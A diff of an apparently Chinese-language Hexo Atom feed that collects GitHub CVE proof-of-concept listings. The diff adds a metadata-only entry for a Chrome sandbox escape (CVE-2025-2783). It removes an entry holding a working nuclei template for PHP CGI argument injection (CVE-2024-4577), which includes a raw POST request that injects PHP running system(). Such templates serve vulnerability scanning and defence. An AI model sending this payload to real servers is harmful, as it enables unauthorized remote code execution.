@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-16T00:00:17.009Z</updated>
+  <updated>2025-06-16T00:15:12.465Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Google Chrome 沙盒逃逸漏洞</title>
+    <link href="http://example.com/2025/06/16/github_2832016881/"/>
+    <id>http://example.com/2025/06/16/github_2832016881/</id>
+    <published>2025-06-16T00:15:12.468Z</published>
+    <updated>2025-06-16T00:15:12.465Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Google Chrome 沙盒逃逸漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-2783</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该项目是一个研究和教育模拟，旨在展示Google Chrome（版本134.0.6998.177）中沙盒逃逸漏洞的概念，通过Mojo IPC利用不当的句柄验证。</p><p><strong>产品厂商：</strong> Google</p><p><strong>产品名称：</strong> Google Chrome</p><p><strong>影响版本：</strong> 134.0.6998.177</p><p><strong>来源：</strong> <a href="https://github.com/byteReaper77/CVE-2025-2783-SandboxEscape">https://github.com/byteReaper77/CVE-2025-2783-SandboxEscape</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>SandBoxEscapeSim.c</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Google Chrome 沙盒逃逸漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
   
   <entry>
     <title>Motive eSIM Secure Connect Panel 信息泄露漏洞</title>
@@ -515,33 +542,6 @@
     <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
     
     <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PHP CGI 参数注入远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/15/github_478356321/"/>
-    <id>http://example.com/2025/06/15/github_478356321/</id>
-    <published>2025-06-15T11:16:26.207Z</published>
-    <updated>2025-06-15T11:16:26.204Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PHP CGI 参数注入远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-4577</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> PHP的CGI实现中存在一个严重漏洞，允许远程攻击者通过命令注入执行任意代码。该漏洞由于PHP CGI中命令行参数处理不当，可以被利用来绕过安全限制，并以Web服务器的权限执行任意命令。此漏洞影响所有8.3.4、8.2.17和8.1.27之前的PHP版本。</p><p><strong>产品厂商：</strong> PHP</p><p><strong>产品名称：</strong> PHP</p><p><strong>影响版本：</strong> version &lt; 8.3.4, version &lt; 8.2.17, version &lt; 8.1.27</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/99b80323bce38b4c5dd0f76f9f1e6dfd8fc1a6c2/CVE-2024-4577.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/99b80323bce38b4c5dd0f76f9f1e6dfd8fc1a6c2/CVE-2024-4577.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">4577</span><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> PHP CGI Argument Injection RCE<br>  <span class="hljs-params">author:</span> gaurang<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    A critical vulnerability <span class="hljs-keyword">in</span> PHP&#x27;s CGI implementation allows remote attackers to execute <br>    arbitrary code through command injection. The vulnerability exists due to improper handling <br>    of command-line arguments <span class="hljs-keyword">in</span> PHP CGI, which can be exploited to bypass security restrictions <br>    and execute arbitrary commands <span class="hljs-keyword">with</span> the privileges of the web server. This vulnerability <br>    affects all PHP versions before <span class="hljs-number">8.3</span>.<span class="hljs-number">4</span>, <span class="hljs-number">8.2</span>.<span class="hljs-number">17</span>, and <span class="hljs-number">8.1</span>.<span class="hljs-number">27</span>.<br>    <span class="hljs-params">References:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/cve-2024-4577</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.tarlogic.com<span class="hljs-operator">/</span>blog<span class="hljs-operator">/</span>cve-<span class="hljs-number">202</span>4-<span class="hljs-number">457</span>7-critical-vulnerability-php<span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//learn.microsoft.com/en-us/answers/questions/1725847/php-8-3-vulnerability-cve-2024-4577</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.stormshield.com<span class="hljs-operator">/</span>news<span class="hljs-operator">/</span>security-alert-php-cve-<span class="hljs-number">202</span>4-<span class="hljs-number">457</span>7-stormshields-product-response<span class="hljs-symbol">/</span><br>  <span class="hljs-params">tags:</span> cve,rce,exploit,php<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>php-cgi<span class="hljs-operator">/</span>php-cgi.exe<span class="hljs-operator">?</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>cgi.force_redirect<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>cgi.redirect_status_env<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>fastcgi.impersonate<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>auto_prepend_file<span class="hljs-operator">=</span>php:<span class="hljs-operator">//</span>input<span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>allow_url_include<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>allow_url_fopen<span class="hljs-operator">=</span><span class="hljs-number">1</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>        <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span><br><br>        <span class="hljs-operator">&lt;</span><span class="hljs-operator">?</span>php\necho &#x27;[START]&#x27;;\nsystem(&#x27;echo CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">457</span>7-TEST&#x27;);\necho &#x27;[END]&#x27;;\ndie();<br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;[START]CVE-2024-4577-TEST[END]&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">Hostname:</span> <span class="hljs-string">&quot;example.com&quot;</span>  <span class="hljs-comment"># Replace with target hostname or IP.</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PHP CGI 参数注入远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
